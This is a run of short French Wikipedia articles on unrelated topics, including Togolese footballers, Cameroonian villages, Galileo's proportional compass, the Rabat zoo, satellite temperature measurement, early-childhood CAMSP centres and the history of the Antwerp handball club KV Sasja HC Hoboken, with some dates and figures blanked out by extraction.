Les cercles dramatiques du Borinage sont essentiellement voués au théâtre dialectal. Jusqu’aux années 1850, les écrivains patoisants émanent de la bourgeoisie aisée peignant le peuple dans le langage du peuple. Plus tard se produit une véritable démocratisation avec l’apparition d’auteurs ouvriers et artisans dont certains délaissent leur travail pour vivre de leur plume. Les cercles dramatiques ouvriers prolifèrent. On en trouve au sein des Maisons du Peuple et des coopératives. La plupart adhèrent à la Fédération nationale des cercles socialistes constituée en 1909. On assiste à un mouvement semblable, quoique moins important, chez les catholiques où se côtoient auteurs ouvriers et bourgeois bien pensants. Il faut également citer les troupes financées par le patronat. Mais la plupart de ces sociétés affichent plutôt une neutralité politique.

</doc>
<doc id="10580117" url="https://fr.wikipedia.org/wiki?curid=10580117" title="Hakim Ouro-Sama">
Hakim Ouro-Sama

Hakim Ouro-Sama (né le à Agbodrafo au Togo) est un joueur de football international togolais.
Biographie.
Carrière en club.
Hakim Ouro-Sama est formé au Liberty Sport Académie d'Agbodrafo puis il rejoint, en 2016, l'AS Togo-Port de Lomé. Il y remporte le championnat du Togo ainsi que la coupe du Togo en 2017. Il participe la saison suivante à la Ligue des champions de la CAF.
Le , il s'engage pour cinq ans avec le LOSC Lille. Après une saison passée avec la réserve du club nordiste, il est prêté à l'été 2019 au club portugais du Belenenses SAD.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Togo le , en amical contre l'Ouganda (victoire 1-0).
Il participe avec le Togo à la Coupe d'Afrique des nations 2017 organisée au Gabon.

</doc>
<doc id="10580122" url="https://fr.wikipedia.org/wiki?curid=10580122" title="Engong (Lembe-Yezoum)">
Engong (Lembe-Yezoum)

Engong est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Engong comptait 67 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 8 personnes.

</doc>
<doc id="10580124" url="https://fr.wikipedia.org/wiki?curid=10580124" title="Franco Atchou">
Franco Atchou

Franco Atchou (né le au Togo) est un joueur de football international togolais, qui évolue au poste de milieu de terrain.
Il a évolué avec le club du Dynamic Togolais où il a fait de nombreux exploits. Après un passage pour un essai avec le club tunisien CS Sfax en , le jeune Franco rejoint le Stade Malien après son retour de la CAN 2017 : il est en effet prêté en janvier de retour de la CAN au club malien Stade Malien où il a joué 2 matchs officiels et 6 matchs amicaux puis la FIFA a sanctionné le Mali et le championnat malien a été suspendu provisoirement. 
Son agent lui trouve une porte de sortie et négocie un prêt de 6 mois avec le club nigérian Enyimba FC, ce qui lui permettra d'être en compétition en attendant le mercato d'été.
Biographie.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Togo le , contre le Niger (défaite 2-0).
Il participe avec le Togo à la Coupe d'Afrique des nations 2017 organisée au Gabon.

</doc>
<doc id="10580125" url="https://fr.wikipedia.org/wiki?curid=10580125" title="Kokoa">
Kokoa

Kokoa est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Kokoa comptait 180 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 260 personnes.

</doc>
<doc id="10580141" url="https://fr.wikipedia.org/wiki?curid=10580141" title="Compas de proportion de Galilée">
Compas de proportion de Galilée

Le compas de proportion de Galilée est un compas de proportion conçu par Galilée et conservé au Museo Galileo à Florence.
Description.
Il s'agit d'un des nombreux compas construits par Galilée à partir de 1597. Il pourrait s'agir de l'exemplaire donné par Galilée à Cosme II des Medicis avec la presse "Le operazioni del compasso geometrico et militare", publiée à Padoue en 1606. Le compas de Galilée, qui ne doit pas être confondu avec le compas de dessin, est un instrument sophistiqué et polyvalent de calcul conçu pour exécuter de nombreuses opérations géométriques et arithmétiques exploitant la proportionnalité entre les côtés homologues de deux triangles similaires. Ce compas est composé de trois parties : deux bras, axés en un disque rond, dit "nocella", sur lesquelles face recto et verso sont gravées de nombreuses échelles ; le cadran, gradué avec diverses échelles, qui vient fixé, via les vis dites "galletti", aux trous pratiqués sur les bras du compas ; et la "zanca", un curseur qui est enfilé dans un des bras du compas et qui permet soit de tenir l'instrument à la verticale; soit d'allonger le bras dans lequel il est enfilé.
La priorité de l'invention de l'instrument par Galilée fut contestée par le Milanais Baldassarre Capra, qui se proclama le premier à l'avoir découvert dans une œuvre publiée à Padoue en 1607. Galilée répliqua efficacement aux prétentions de Capra avec une péremptoire "Difesa."
Le compas, initialement conservé à La Galleria degli Uffizi, fut déposé au milieu du dans la Tribuna di Galileo, projetée par Giuseppe Martelli.    

</doc>
<doc id="10580142" url="https://fr.wikipedia.org/wiki?curid=10580142" title="Maklibè Kouloum">
Maklibè Kouloum

Maklibè Kouloum (né le au Togo) est un joueur de football international togolais, qui évolue au poste de défenseur.
Il évolue avec le club du Dynamic Togolais.
Biographie.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Togo le , en amical contre la Zambie (victoire 1-0).
Il participe avec le Togo à la Coupe d'Afrique des nations 2017 organisée au Gabon.

</doc>
<doc id="10580143" url="https://fr.wikipedia.org/wiki?curid=10580143" title="Melo (Lembe-Yezoum)">
Melo (Lembe-Yezoum)

Melo est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Melo comptait 186 habitants, principalement des yezoum. Lors du recensement de 2005, on y a dénombré 159 personnes.

</doc>
<doc id="10580147" url="https://fr.wikipedia.org/wiki?curid=10580147" title="Mengueme (Lembe-Yezoum)">
Mengueme (Lembe-Yezoum)

Mengueme est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Mengueme comptait 181 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 105 personnes.

</doc>
<doc id="10580150" url="https://fr.wikipedia.org/wiki?curid=10580150" title="Greene (Iowa)">
Greene (Iowa)

Greene est une ville du comté de Butler, en Iowa, aux États-Unis. Elle est située en bordure de la . La ville est incorporée le . Elle s'est d'abord appelée "Elm Springs", mais le nom est changé lorsque le juge , président de la compagnie de chemin de fer , fait un don d' pour la construction d'une bibliothèque.
&lt;mapframe zoom=12 latitude =42.8975 longitude =-92.80333 align=left width=250 height=250 text="Carte interactive de Greene"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q1932538", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10580151" url="https://fr.wikipedia.org/wiki?curid=10580151" title="Liste des sénateurs des États-Unis pour le Nouveau-Mexique">
Liste des sénateurs des États-Unis pour le Nouveau-Mexique

Cet article dresse la liste des membres du Sénat des États-Unis élus de l'État du Nouveau-Mexique depuis son admission dans l'Union le 6 janvier 1912.
Élections.
Les deux sénateurs sont élus au suffrage universel direct pour un mandat de six ans. Les prochaines élections auront lieu en pour le siège de la classe I et en pour le siège de la classe .

</doc>
<doc id="10580173" url="https://fr.wikipedia.org/wiki?curid=10580173" title="Grewia coriacea">
Grewia coriacea

"Grewia coriacea" Mast. est une espèce d'arbre de la famille des "Malvaceae" originaire d'Afrique tropicale. Elle présente de remarquables qualités tinctoriales pour les populations d'Afrique centrale étant donné sa fréquence d'utilisation, sa répartition géographique et sa facilité d'approvisionnement.
Description.
"Grewia coriacea" est un arbuste mesurant de 10 à de haut. Ses feuilles sont simples, à stipules oblongues et elliptiques, et ses inflorescences prennent la forme de panicules terminales et axillaires mesurant entre 3 et de long. Ses fleurs sont jeunes, soit bisexuées soit unisexuées avec 5 sépales tomenteux et 5 pétales plus petits que les sépales, glanduleux et dont l'ovaire est supère, à 3 loges. Les fruits sont des drupes ovoïdes piriformes à exocarpe coriace avec une graine. La plante est sempervirente et fructifie en mai, juin et juillet.
Répartition.
Il existe environ une trentaine d'espèces du genre "Grewia" qui se distribue sur les plateaux, Pool et Bouenza, dans les régions dont le climat est équatorial à tropical, les sols argilo-sableux et où les pluies sont abondantes.
Propriétés.
Les analyses phytochimiques de l'extrait rouge sang des fruits de cette plante ont révélé la présence de flavonoïdes et d'anthocyanes, ainsi que de tanins condensés.
Aspects culturels.
Le jus coloré des fruits est souvent associé à de l'argile (kaolin) afin de décorer en rouge les nombreuses parures utilisées au cours des cérémonies traditionnelles de mariage, ainsi que pour le maquillage de la mariée.
Un de ses noms vernaculaires est "Tsui" en langue Téké).
Voir aussi.
Liens externes.
Iconographie :

</doc>
<doc id="10580177" url="https://fr.wikipedia.org/wiki?curid=10580177" title="Baciro Candé">
Baciro Candé

Baciro Candé (né le à Catió à l'époque en Guinée portugaise et aujourd'hui en Guinée-Bissau) est un joueur de football international bissaoguinéen, qui évoluait au poste de défenseur, avant de devenir ensuite entraîneur.

</doc>
<doc id="10580189" url="https://fr.wikipedia.org/wiki?curid=10580189" title="Gustavo Muler">
Gustavo Muler

Gustavo Muler est un astronome amateur espagnol, né en 1967 en Argentine.
Il effectue ses observations depuis l'archipel des Îles Canaries.
Le Centre des planètes mineures le crédite la découverte de vingt et un astéroïdes, effectuées entre 2008 et 2010, parmi elles certaines avec la collaboration de Jose Maria Ruiz.
L'astéroïde (458063) Gustavomuler lui a été dédié.

</doc>
<doc id="10580200" url="https://fr.wikipedia.org/wiki?curid=10580200" title="Jose Maria Ruiz">
Jose Maria Ruiz

Jose Maria Ruiz est un astronome amateur espagnol.
Le Centre des planètes mineures le crédite de la découverte de quatre astéroïdes, toutes effectuées en 2008 avec la collaboration de Gustavo Muler.

</doc>
<doc id="10580238" url="https://fr.wikipedia.org/wiki?curid=10580238" title="Jardin zoologique national de Rabat">
Jardin zoologique national de Rabat

Le Jardin zoologique de Rabat, plus couramment appelé le Zoo de Rabat, est un parc zoologique national situé à Rabat, la capitale du Maroc. Le Jardin zoologique de Rabat détient le plus grand nombre (quarante spécimens en octobre 2024) de Lions de l'Atlas en captivité. Ces derniers sont aujourd'hui considérés comme éteints à l'état sauvage.
Le Zoo de Rabat, est devenu l’un des sites d'attraction les plus fréquentés de la capitale marocaine. En 2008, sous l’impulsion du Roi Mohammed VI, une vaste opération de rénovation est lancée afin de moderniser les installations et de transformer l’ancien parc zoologique en un espace où les animaux vivent en semi-liberté.
Ouvert au public dans sa nouvelle configuration depuis 2012 et son inauguration par le prince Moulay Hassan, le Zoo de Rabat met un accent particulier sur la sauvegarde et la protection d’espèces en danger ou en voie d’extinction, notamment en plus du lion de l'atlas, de certaines antilopes sahéliennes telles que l’addax ou l’oryx algazelle, ainsi que l’ibis chauve. Le parc participe à des programmes de reproduction, avec de fréquentes naissances, et alimente également certains parcs nationaux dans le cadre de projets de réintroduction dans la nature.
Le parc zoologique abrite plus de 180 espèces. Il œuvre sur plus de 22 programmes de conservation des espèces endémiques rares et menacées d’extinction. 8 de ces espèces font l’objet d’un programme de réintroduction afin qu’elles réintègrent leur habitat naturel, parmi lesquelles 5 espèces éteintes à l’état sauvage au Maroc.
Le zoo est organisé autour de cinq écosystèmes : le Grand Atlas, le Sahara, la Savane africaine, la forêt équatoriale et les zones humides.

</doc>
<doc id="10580241" url="https://fr.wikipedia.org/wiki?curid=10580241" title="Zoo de Rabat">
Zoo de Rabat



</doc>
<doc id="10580242" url="https://fr.wikipedia.org/wiki?curid=10580242" title="Recherché en Mai">
Recherché en Mai



</doc>
<doc id="10580247" url="https://fr.wikipedia.org/wiki?curid=10580247" title="Parkersburg (Iowa)">
Parkersburg (Iowa)

Parkersburg est une ville du comté de Butler, en Iowa, aux États-Unis. La ville est incorporée le . 
Les premiers colons connus dans la région de Parkersburg sont "John Connell" et son fils "William", qui y construisent une cabane en bois en 1857. Une compagnie de chemin de fer inspecte la région, au début des années 1860. Une gare est érigée en 1865 et deux lignes de chemins de fer, de l'Illinois Central Railroad et Chicago and North Western Railway, sont construites à travers la ville. La ville est bientôt tracée puis enregistrée sous le nom de "Parkersburg" en l'honneur de "Pascal P. Parker", un colon de la première heure et premier postier de la ville. La première grande affaire de la ville est un hôtel construit par "Thomas Williams", appelé "The Williams House". Plus tard, il devient la "Maison Commerciale".

</doc>
<doc id="10580259" url="https://fr.wikipedia.org/wiki?curid=10580259" title="Dädesjö">
Dädesjö

Dädesjö est un village de la municipalité suédoise de Växjö, comté de Kronoberg, dans la province méridionale du Småland.
Géographie et démographie.
Le village s'étend sur et se situe à environ au nord de la ville de Växjö. 
On y recensait en 2023.
Histoire.
Dädesjö a une longue histoire en tant que centre paroissial et centre urbain constituant un environnement culturel d'intérêt national. On y trouve des traces de la Préhistoire avec des cimetières anciens et un marché qui est toujours utilisé. 
Au cours de l'ère ferroviaire du , un nouveau centre s'est développé entre l'ancien village paroissial et les cimetières. Il existe deux ensembles de bâtiments religieux préservés, deux églises et deux générations de presbytères. On trouve également une maison, un magasin et des écuries paroissiaux. La nouvelle église a été construite en raison de l'augmentation de la population à la fin du . 
L'ancienne église a été préservée jusqu'à nos jours grâce au fait qu'elle a été utilisée pendant un certain temps comme grenier à grains. L'église médiévale abrite des peintures murales uniques représentant l'Évangile de Noël ("Julevangeliet") et la légende de saint Étienne ("Staffan stalledräng").
Notes et références.
 

</doc>
<doc id="10580272" url="https://fr.wikipedia.org/wiki?curid=10580272" title="Piste de Matekane">
Piste de Matekane

La piste d'atterrissage de Matekane au Lesotho, en Afrique australe, est d'une longueur de  et se termine au bord d'une falaise d'une hauteur de 600 mètres. La piste est utilisée par les organismes de bienfaisance et les médecins pour accéder aux villages de la région, et est souvent citée comme étant l'une pistes les plus effrayantes au monde.

</doc>
<doc id="10580275" url="https://fr.wikipedia.org/wiki?curid=10580275" title="Une suite qui dérange">
Une suite qui dérange

Une suite qui dérange : Le temps de l'action ("") est un film documentaire américain réalisé par Bonni Cohen et Jon Shenk et sorti en 2017. Il fait suite au film sorti en 2006 "Une vérité qui dérange" de Davis Guggenheim.
Synopsis.
Al Gore fait le bilan des dix années écoulées de lutte contre le réchauffement climatique, principalement politique et idéologique, et des effets actuels et prévisions futures de son impact sur la Terre et ses habitants.
Production.
Le documentaire est remonté avant sa sortie en salle pour inclure la décision de Donald Trump de retirer les États-Unis de l'accord de Paris sur le climat.
Accueil.
Le quotidien suisse "Le Temps" a salué la sortie du film : 
Pour "Le Monde", 

</doc>

<doc id="6804937" url="https://fr.wikipedia.org/wiki?curid=6804937" title="Centre d'action médico-sociale précoce">
Centre d'action médico-sociale précoce

Un Centre d'action médico-sociale précoce ou CAMSP est en France une structure entrant dans la catégorie des établissements et services sociaux ou médico-sociaux destiné au dépistage, au diagnostic, au traitement, à la rééducation et au suivi des enfants présentant un handicap avant leur scolarisation (de 0 à 6 ans).
Un CAMSP est soit un établissement privé non personnalisé, relevant d'un organisme gestionnaire titulaire de son autorisation, soit un établissement public pouvant être intégré à un établissement hospitalier, ou dans d'autres structures comme celles de la Protection maternelle et infantile.
En 2006, 277 CAMSP et structures assimilées font sur l'ensemble du territoire français l'objet d'une étude de la Caisse nationale de solidarité pour l'autonomie (CNSA).
Mission de service public.
La loi d'orientation du et le décret du (annexe XXXII bis), à la suite des décrets du et du définissant l'agrément des CMPP (Centres médico-psycho-pédagogiques), définissaient ainsi les conditions d'agrément des CAMSP :
Ces textes ayant été abrogés par l'effet de l'entrée en vigueur du nouveau Code de l'action sociale et des familles puis de la loi du rénovant l'action sociale et médico-sociales, la définition actuelle des missions des CAMSP résulte notamment des dispositions de l'article L. 2132-4 du Code de la santé publique. Ainsi la prise en charge s'effectue-t-elle sous forme de cure ambulatoire comportant l'intervention d'une équipe pluridisciplinaire ; elle comporte une action de conseil et de soutien de la famille ou des personnes auxquelles l'enfant a été confié. Elle est assurée, s'il y a lieu, en liaison avec les institutions d'éducation préscolaires et les établissements et services de la petite enfance.
Les missions des CAMSP ne relèvent pas, par leur seule nature, d'une mission de service public. Ce peut être le cas si l'organisme gestionnaire est une personne morale de droit public chargée d'une mission de service public administratif (SPA). Dans les autres cas, en l'état d'un arrêt du Conseil d'État du (Association Aprei) et en dépit de l'analyse contraire d'une partie de la doctrine (O. Poinsot, « Les institutions privées et le service public de l'action sociale et médico-sociale », RGCT , novembre-, ), les CAMSP en tant qu'établissements ou services sociaux ou médico-sociaux (ESSMS) n'exercent pas de mission de service public.
Organisation.
Les CAMSP sont composés d'équipes pluridisciplinaires : professionnels de santé, du domaine paramédical, de l'éducation spécialisée. Ces équipes sont coordonnées par un médecin, ou par un directeur assisté par un médecin "directeur technique".
Le champ d'intervention d'un CAMSP permet l'implication de professionnels d'horizons divers : médecin généraliste ou pédiatre ou psychiatre, personnel infirmier, kinésithérapeute, psychomotricien, ergothérapeute, orthophoniste, psychologue, assistante sociale, éducateur spécialisé, éducateur de jeunes enfants.
Prise en charge.
Un CAMSP propose à chaque enfant diagnostiqué une prise en charge adaptée à sa situation. Les enfants ainsi accueillis bénéficient de la protection du droit des usagers au même titre que les personnes accueillies ou accompagnées dans les autres catégories d’ESSMS.
Évaluation.
En 2009, la CNSA procède à une étude des CAMSP afin de mieux définir leur action et leur intervention.

</doc>
<doc id="6804940" url="https://fr.wikipedia.org/wiki?curid=6804940" title="Mesure de température par satellite">
Mesure de température par satellite

La mesure de température par satellite de l’atmosphère à diverses altitudes, de celle du sol et de la mer se fait par interprétation des mesures de capteurs sensibles à la luminance terrestre dans différentes longueurs d’onde. Les satellites météorologiques comportent maintenant souvent plus de 10 de ces capteurs qui permettent de sonder l’atmosphère pour repérer la structure des nuages et des systèmes météorologiques, les effets des îlots de chaleur urbains, les courants marins, les phénomènes comme El Niño, les feux de forêt, les émissions volcaniques et celles des industries polluantes.
La banque de données recueillies depuis que les capteurs sont assez sophistiqués permet aussi de discerner les tendances de la température moyenne du globe. Depuis 1978, les données des capteurs infrarouges des satellites circumpolaires de la National Oceanic and Atmospheric Administration suivant la signature thermique de l’oxygène dans une importante couche de l’atmosphère démontrent un réchauffement de la troposphère et un refroidissement de la stratosphère en accord avec la notion de réchauffement climatique.
Mesure.
Les satellites ne mesurent pas directement la température. Ils sont équipés de capteurs (radiomètres) sensibles à la luminance de l’atmosphère et de la mer dans le domaine des infrarouges. Les données de satellites couvrent pratiquement tout le globe terrestre avec une bonne précision. Seules les latitudes supérieures à 85 degrés nord et sud ont moins de données à cause de l'angle rasant qu'elles ont pour les satellites géostationnaires et le passage moins fréquent des satellites à orbite polaire.
Comme l'atmosphère absorbe très peu le rayonnement thermique infrarouge émis par l'océan, la longueur d'onde qui va de peut mesurer la température de surface de la mer et de la surface terrestre au-dessus des zones non nuageuses depuis un satellite géostationnaire. Un satellite à défilement, par contre, obtient l'estimation du profil vertical de température en utilisant la bande d'absorption du gaz carbonique, centrée sur . En présence de nuages, c'est plutôt la bande d'absorption de l'oxygène en ondes millimétriques qui est utilisée.
Pour obtenir la température, il faut faire un traitement informatique des données grâce à l'application de la loi de Planck sur le rayonnement d'un corps noir.
Étalonnage et causes d'erreurs.
Le profil vertical de températures obtenu dépend ensuite de la précision de la conversion et des capteurs. Différents groupes ont analysé les données disponibles et bien que les résultats soient voisins, ils se sont pas exactement semblables à cause des limites de chacun des algorithmes utilisés. Parmi les banques de températures obtenues, il y a celle de l’université d'Alabama à Huntsville ("UAH satellite temperature dataset") et celle de la compagnie "Remote Sensing Systems".
Ces deux ensembles de données sont tirées des données de plusieurs générations de satellites dont les capteurs ne sont pas homogènes. En effet, les appareils ont subi des améliorations lors des générations successives de satellites météorologiques. Les données provenant des premiers capteurs ne sont donc pas à la même résolution ni de la même sensibilité que celles provenant des capteurs récents. De plus, en vieillissant, chacun des capteurs change graduellement ses caractéristiques comme n'importe quel appareil électronique. L’étalonnage avec des données de surface et aérologiques est donc essentiel pour obtenir un continuum valable.
Instruments et usages.
Température de surface.
La luminance terrestre par temps dégagé donne la température à la surface de la Terre via les radiomètres avancés à très haute résolution (sigle "AVHRR"). Les données de température de surface de la mer sont ainsi disponibles depuis 1967 et des cartes globales des mers sont faites depuis 1970. Depuis 1982, ces données sont de plus en plus précises et utilisées pour la prévision météorologique, en particulier pour le développement des cyclones tropicaux. Autre exemple, les changements de température associés avec le phénomène El Niño sont suivis depuis les années 1980.
Sur les îles et les continents, les mesures sont plus difficiles parce que les surfaces ne sont pas homogènes. Cependant, les études sur le réchauffement climatiques et les îlots de chaleur urbains sont quand même possibles avec les satellites. L’utilisation des "AVHRR" permet par temps dégagé de voir les différentes de masses d’air associées avec les fronts météorologiques.
Par temps couvert, les données sont utilisées dans la technique de Dvorak pour obtenir la différence de température entre l’œil et le sommet des nuages autour du centre d’un cyclone tropical pour estimer les vents maximum soutenus et la pression centrale du système.
Les radiomètres avancées de trajectoire (sigle AATSR) à bord des satellites météorologiques permettent de détecter les feux de forêt qui apparaissent comme des « points chauds » dépassant . Les radiomètres spectraux pour imagerie de résolution moyenne des satellites Terra peuvent aussi détecter les feux de forêts, les volcans en éruption et les points chaud industriels.
Sondage aérologique.
Depuis 1979, l’unité de sondage infrarouge des satellites TIROS de la NOAA mesure l’intensité de l’émission infrarouge provenant de l’oxygène. Ce rayonnement est proportionnel à la température d’une large couche de l’atmosphère tel que montré par la théorie, ainsi que pratiquement en comparant avec les données de radiosondage. Elles se notent à différentes fréquences, chacune reliée à une zone d’altitudes donnée. La fréquence du canal 2 de ces capteurs correspond en gros à la température de la troposphère avec la pondération gaussienne maximale est autour de (la demi-puissance du signal se trouvant à et ). Il y a cependant un certain recoupement avec la basse stratosphère et pour le minimiser, les chercheurs Roy Spencer et ont développé un algorithme alliant les données obtenues à différents angles de visées du satellite qui ramène le maximum plus près du sol à mais qui amplifie le bruit de fond et rend l’étalonnage des données d’un satellite à l’autre plus difficile. Cet algorithme a graduellement été amélioré par diverses corrections.
Depuis 1979, les mêmes satellites ont une unité de sondage stratosphérique. Il s’agit d’un radiomètre sensible à l’infrarouge lointain autour de la longueur d’onde de reliée à l’absorption du rayonnement par le dioxyde de carbone (). Comme l’absorption est proportionnelle à la pression, l’unité comporte trois capteurs qui peuvent diviser la stratosphère en trois couches centrées à , et d’altitude, selon la densité de l’absorption.
Tendances historiques.
En combinant les résultats normalisés et étalonnés des différents capteurs, les tendances de températures dans la troposphère et la stratosphère apparaissent. Le tableau montre une instabilité de la tendance (en °C/10 ans) des résultats et la banque de données ne couvre qu’une période relativement courte (1978 à maintenant) à l’échelle historique ce qui rend l’analyse ardue. Cependant, une étude de Christy "et al." montre une bonne concordance avec les données des radiosondages tropicaux pour la même période. Elle montre une réchauffement troposphériques des Tropiques de par décennie, avec une erreur de . D'autres études obtiennent des valeurs légèrement différentes ( et
 ) mais en accord avec un réchauffement.
Un refroidissement graduel de la température de la basse stratosphère est noté dans les données des satellites. Selon les études, un tel refroidissement est surtout causé par la destruction de la couche d'ozone, ainsi qu’une augmentation du contenu en vapeur d’eau et d’autres gaz à effet de serre. Ce phénomène s'est cependant temporairement inversé durant quelques épisodes d’éruptions volcaniques majeures comme celle du El Chichón (1982) et du mont Pinatubo (1991), à la suite de l'augmentation de la concentration d’ozone dans les deux années suivantes.
Ce comportement de l’atmosphère, soit un réchauffement de troposphère et un refroidissement de la stratosphère, est en accord avec un réchauffement climatique.

</doc>
<doc id="6804942" url="https://fr.wikipedia.org/wiki?curid=6804942" title="Greater Napanee">
Greater Napanee



</doc>
<doc id="6804945" url="https://fr.wikipedia.org/wiki?curid=6804945" title="Furane-lactone">
Furane-lactone



</doc>
<doc id="6804947" url="https://fr.wikipedia.org/wiki?curid=6804947" title="Lactone-furane">
Lactone-furane



</doc>
<doc id="6804948" url="https://fr.wikipedia.org/wiki?curid=6804948" title="KV Sasja HC Hoboken">
KV Sasja HC Hoboken

 
Le Koninklijke Vereniging Sport Afdelingen Syndicale Jeugd Antwerpen Handbal club Hoboken, parfois abrégé en KV Sasja HC Hoboken, est un club de handball, situé à Anvers dans la province éponyme en Belgique.
Anciennement dénommé "HB Beerschot", le club est à l'origine, porteur du matricule 041 mais à la suite d'une crise vers la fin des années 90, il acquiert le matricule 191 du HC Kiewit.
Important club en Belgique dans les années 60, années 70 et années 2000, la formation anversoise remporta cinq fois le championnat de Belgique, six fois la Coupe de Belgique et une fois la BeNe League, lors de sa première édition, alors "BeNe Liga".
Le club est affilié à la VHV et évolue en Division 1.
Histoire.
Création.
En 1933, le célèbre club omnisports anversois du Beerschot AC, décide de fonder une section handball qu'ils appelleront "Handbal Beerschot" ou "HB Beerschot", cette section fut porteuse du matricule 041.
En 1958 deux des athlètes de la section athlétisme, Sus Weyn et Stan Crab décidèrent de s'investir pour la section handball au point qu'elle se retrouva indépendante.
Les deux athlètes étant membres de la jeunesse anversoise de la FGTB renommèrent le club, le "KV Sasja HC", Sasja voulant signifier "Sport Afdelingen Syndicale Jeugd Antwerpen".
Par la suite, le nom "Hoboken" de KV Sasja HC Hoboken est venu s'y rajouter pour spécifier l'endroit d'Anvers où évolue désormais le club.
Les années 60 : De la montée au titre.
Le début des années 1960 fut pour le KV Sasja HC Hoboken, synonyme d'apparition en division 1 et d'Y évoluer avec les meilleures formations du pays alors que la seconde partie de la décennie fut synonyme par le club de la métropole de titres.
En effet, après s'être hissé en 1960 de la deuxième division à la première division, le club subit comme le reste des formations du pays, la domination des liégeois du OC Flémallois, les mosans qui dominèrent le handball belge jusqu'en 1965 où, bien que restant cependant un rude concurrent pour le titre, d'autres clubs se montrèrent et parvinrent à remporter divers titres, comme le CH Schaerbeek Brussels, le Progrès HC Seraing, le HC Inter Herstal, l'Avia Woluwe, le Sparta Aalst mais aussi le KV Sasja HC Hoboken.
Le KV Sasja qui en 1967 réussit à se qualifier en finale de la Coupe de Belgique mais fut défait par le HC Inter Herstal, 21 à 17, club de division 2 à l'époque.
Une saison 1966/1967 qui se solda par une place de dauphin du Progrès HC Seraing pour le club anversois.
La saison qui suivit, le Championnat de Belgique est des plus disputé puisque le KV Sasja HC Hoboken tout comme le club liégeois du ROC Flémallois pouvaient être encore Champion.
Le sort des deux équipes fut fixé lors de la dernière journée de la compétition puisqu'une des affiches de cette dernière journée était la rencontre "KV Sasja HC-ROC Flémallois", une rencontre jouée à Wilrijk, autrement dit sur le terrain du Sasja, Celui-ci ne fit qu'une bouchée des octuples champions de Belgique.
En effet, s'imposant 20 à 7, devant un public d'anversois déchaîné, le KV Sasja remporta son tout premier titre.
Les années 1970 : Nouveaux sacres et Coupe d'Europe.
La décennie débute plutôt bien pour le club de la métropole qui remporte lors de la saison 1970/1971, sa toute première Coupe de Belgique, un trophée que le KV Sasja HC Hoboken décrocha 17 à 13 face au HC Renaissance Montegnée, club de division 2 alors que cette même saison, du côté du Championnat, le KV Sasja HC a encore toutes ses chances pour le titre puisqu'après avoir battu la redoutable formation du SK Avanti Lebbeke, 7 à 13 lors d'une rencontre au sommet du handball flandrien puisque le match fut diffusé en direct sur la BRT, une première pour le handball belge mais ce fut sans compté le handball liégeois puisque les anversois chutent face au HC Inter Herstal lors de la dernière journée, une rencontre où l'arbitrage fut contesté et où l'on retiendra que "Sus Weyn", l'emblématique joueur et fondateur du KV Sasja HC Hoboken jeta le sifflet de l'arbitre dans la prairie avoisinante.
La saison 1972/1973, fut également à marquer d'une croix pour le club de la métropole puisque le KVS a remporté sa deuxième Coupe de Belgique à Charleroi, face aux flandriens du SK Avanti Lebbeke dans un match très intense, se ponctuant sur le score de 22 à 21.
Les deux saisons qui suivirent se soldèrent par un deuxième et un troisième sacres de Champion de Belgique. Ces titres furent synonyme de parcours européen en Coupe des clubs champions lors de la saison 1974/1975, où le club se qualifie au deuxième tour en remportant ses deux rencontres face aux luxembourgeois du HB Eschois Fola sur un total de 22 à 28 (11-16;11-12) mais au tour suivant les anversois doivent affronter la formation est-allemande du ASKV Francfort/Oder, soit une grosse écurie dans le paysage handballistique européen, une formation qui lamina les Belges sur un total de 28 à 61 (19-25,9-36), et également lors de la 1975/1976 où après avoir laminer les britanniques du HC Birkenhead sur un total de 17 à 47 (7-18;10-29), le KV Sasja se fait éliminer par les finlandais du Sparta Helsinki sur un total de 37 à 21 (7-18;16-15).
La saison 1976/1977 fut entacher par l'affaire "Sasja-JS Herstal", une affaire où le KVS remit en causes l'arbitrage de ce match qui se déroula en octobre 76 et qui se termina sur un score de 13 à 10, et donc le club déposa une plainte qui sera tout d'abord rejeté puis examiné au près de la fédération qui décida de faire rejouer le match, une rencontre que Sasja perdit, finissant deuxième du classement à un point derrière le Progrès HC Seraing.
Mais cette saison ne fut pas totalement raté puisque Sasja remporta sa troisième Coupe de Belgique, remporté 12 à 10 au détriment du HC Duffel.
Grâce à ce énièmes titres, les anversois participent à la Coupe des coupes où ils se font directement évincé de la compétition par les suisses du ZMC Amicitia Zürich sur un total de 41 à 28 (23-12;18-16).
Les années 80 et 90 : Bons débuts, puis dominations des limbourgeois.
Les années 1980 débutèrent plutôt bien pour le Sasja qui réussit tout d'abord à se hisser en finale de la Coupe de Belgique mais se font défaire 27 à 24 par le Sporting Neerpelt, également champion de Belgique ce qui permit au Sasja d'entreprendre une nouvelle campagne européenne où ils se font éliminer par les danois du Helsingør HF sur un total de 39 à 62 (23-30;16-32) lors du premier tour de la Coupe des coupes.
Par après le KVS concrétisa les choses puisqu'il remporta sa quatrième et sa cinquième Coupe de Belgique et se qualifia deux nouvelles fois pour la Coupe des coupes mais ne parvient toujours pas à passer le premier tour puisque le club se fit éliminer par le club suisse du BSV Berne sur un total de 47 à 35 (20-22;27-13) et par le club danois du KFUM Fredericia sur un total de 30 à 47 (14-23;16-24) respectivement lors des saisons 1981/1982 et 1982/1983.
